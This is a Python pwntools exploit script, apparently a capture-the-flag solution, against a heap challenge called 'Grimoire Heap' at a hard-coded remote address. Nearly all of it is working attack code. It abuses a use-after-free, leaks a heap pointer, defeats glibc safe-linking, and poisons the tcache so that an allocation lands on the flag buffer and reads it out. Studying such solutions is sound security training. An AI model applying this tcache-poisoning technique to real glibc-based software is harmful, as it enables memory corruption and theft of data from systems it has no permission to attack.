#!/usr/bin/env python3
"""
Grimoire Heap - CTF Exploit

Bug: UAF (Use-After-Free) - banish doesn't NULL out the pointer.
The flag is stored in g_flag, a heap buffer of size 0x80.

Strategy: tcache poisoning with safe-linking (glibc 2.32+)
1. Allocate a spell of size 0x80
2. Banish it - goes to tcache
3. Read UAF to get the protected fd (which is chunk_addr >> 12 since tcache was empty)
4. Calculate g_flag address = spell_addr - 0x90
5. Write protected(g_flag) to the freed spell's fd
6. Allocate twice: first returns spell, second returns g_flag
7. Send just newline as data to preserve flag
8. Read the spell at g_flag
"""
from pwn import *
import sys

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    if isinstance(data, str):
        data = data.encode()
    p.send(data)

def edit(p, idx, data):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    if isinstance(data, str):
        data = data.encode()
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = p.recv(size)
    p.recv(1)  # consume trailing newline
    return data

p = connect()
banner = p.recvuntil(b'> ')
print("=== BANNER ===")
print(banner.decode(errors='replace'))

# Step 1: Create spell 0 with size 0x80
print("\n[*] Step 1: Create spell 0 (size 0x80)")
create(p, 0, 0x80, b'PADDING\n')

# Step 2: Banish spell 0 - goes to tcache
print("[*] Step 2: Banish spell 0")
banish(p, 0)

# Step 3: Read UAF to get the protected fd
# In glibc 2.32+ with safe-linking, stored_fd = (chunk_addr >> 12) ^ actual_next
# Since tcache was empty (first free), actual_next = 0
# So stored_fd = chunk_addr >> 12
print("[*] Step 3: Read UAF to get protected fd")
data = recite(p, 0, 0x80)
stored_fd = u64(data[0:8])
key = u64(data[8:16])
print(f"  stored_fd = {hex(stored_fd)}")
print(f"  key       = {hex(key)}")

# Recover the chunk's user data address
spell_addr = stored_fd << 12
print(f"  spell_addr (user data) = {hex(spell_addr)}")

# Calculate g_flag address
# Heap layout: [tcache_perthread_struct 0x290] [g_flag 0x90] [spell 0x90]
# tcache struct: chunk at offset 0, user data at offset 0x10
# g_flag: chunk at offset 0x290, user data at offset 0x2a0
# spell: chunk at offset 0x320, user data at offset 0x330
# So g_flag_user_data = spell_user_data - 0x90
g_flag_addr = spell_addr - 0x90
print(f"  g_flag_addr (user data) = {hex(g_flag_addr)}")

# Step 4: Edit spell 0 (UAF write) - write protected(g_flag) to fd
# protected(ptr) = (pos >> 12) ^ ptr
# pos is the address of the fd field, which is spell_addr
protected_g_flag = (spell_addr >> 12) ^ g_flag_addr
print(f"  protected_g_flag = {hex(protected_g_flag)}")

payload = p64(protected_g_flag) + b'\n'
print(f"  payload = {payload.hex()}")
print("[*] Step 4: Edit spell 0 (UAF write) - poison tcache fd")
edit(p, 0, payload)

# Step 5: Create spell 1 (size 0x80) - returns spell 0's address from tcache
print("[*] Step 5: Create spell 1 (size 0x80) - consumes poisoned entry")
create(p, 1, 0x80, b'X\n')

# Step 6: Create spell 2 (size 0x80) - returns g_flag from poisoned tcache
# Send just newline to preserve the flag content
print("[*] Step 6: Create spell 2 (size 0x80) - should be at g_flag!")
create(p, 2, 0x80, b'\n')

# Step 7: Read spell 2 - should contain the flag
print("[*] Step 7: Read spell 2 - should contain the flag")
data = recite(p, 2, 0x80)
print(f"  data (hex): {data.hex()}")
print(f"  data (ascii): {data}")

# Try to find the flag in the output
try:
    text = data.decode('ascii', errors='ignore')
    print(f"  data (decoded): {text}")
    # Look for flag pattern
    import re
    flags = re.findall(r'[A-Za-z0-9_{}]+', text)
    print(f"  potential flags: {flags}")
except:
    pass

p.sendline(b'0')
p.close()
